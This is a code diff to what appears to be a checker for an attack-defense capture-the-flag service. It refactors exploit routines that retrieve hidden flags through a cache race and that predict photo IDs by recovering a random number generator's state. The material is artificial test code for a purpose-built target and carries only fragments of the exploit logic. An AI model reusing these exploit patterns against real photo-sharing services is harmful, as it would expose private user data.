@@ -1,3 +1,4 @@
+import missing_tests
 from dataclasses import replace
 from threads import run_in_thread
 import time
@@ -394,31 +395,12 @@ async def exploit_cache_race(
     for attempt in range(20):
         await user.update(conn, nu, cookies)
 
-        r = await conn.get(f"/napi/users/{nu.name}/photos", cookies=cookies, timeout=15)
-        if r.status_code != 200:
-            continue
-        try:
-            json = r.json()
-        except Exception as e:
-            raise MumbleException("couldnt decode json: {e}")
-        for pdata in json:
-            if "could be a flag but you cant see it" in pdata.get("description", ""):
-                pd = await conn.get(
-                    f"/napi/photos/{pdata['public_id']}",
-                    cookies=cookies,
-                    timeout=15,
-                )
-                try:
-                    photo_data = r.json()
-                except Exception as e:
-                    raise MumbleException("couldnt decode json {e}")
-                asset_id = photo_data["thumbnail"]["asset_id"]
-                data = await conn.get(
-                    f"/images/photo-{asset_id}",
-                    cookies=cookies,
-                    timeout=15,
-                )
-                return qr.decode(data.content)
+        thumbnails = await user.get_photos(conn, nu.name, cookies)
+
+        for t in thumbnails:
+            if "could be a flag but you cant see it" in t["description"]:
+                data = await photo.get_data_public(conn, t["asset_id"])
+                return qr.decode(data)
 
 
 @checker.putflag(2)
@@ -494,7 +476,7 @@ async def exploit_prng(
         )
         observed.append(pid)
 
-    logger.info(f"observed {len(observed)} public_ids, recovering via escript...")
+    logger.info(f"observed {len(observed)=} public_ids, recovering via escript")
 
     predictions = prng_recover.recover_state(observed)
     if predictions is None:
@@ -516,8 +498,6 @@ async def exploit_prng(
 
 if __name__ == "__main__":
     checker.run()
-
-import missing_tests
 
 
 @checker.putnoise(2)
